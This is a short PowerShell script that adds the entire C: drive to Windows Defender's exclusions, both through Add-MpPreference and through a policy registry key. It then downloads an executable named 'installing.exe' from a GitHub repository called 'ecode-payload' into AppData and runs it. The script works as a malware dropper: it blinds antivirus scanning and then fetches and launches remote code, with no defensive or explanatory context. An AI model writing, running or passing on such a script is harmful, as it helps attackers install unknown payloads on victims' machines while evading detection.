# Add an exclusion path to Windows Defender for the entire C drive (Use with caution)
$exclusionPath = "C:\"
Add-MpPreference -ExclusionPath $exclusionPath
Write-Host "Exclusion path added for: $exclusionPath"

# Add exclusion via Registry (Requires Admin Privileges)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d "" /f

# Specify the URL of the File to download
$url = "https://github.com/XXxadammoxX/ecode-payload/raw/refs/heads/main/installing.exe"

# Specify the output file path in the AppData folder
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, "AppData", "installing.exe")

# Wait briefly to ensure the exclusion is applied
Start-Sleep -Milliseconds 100

# Download the file from the specified URL
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile
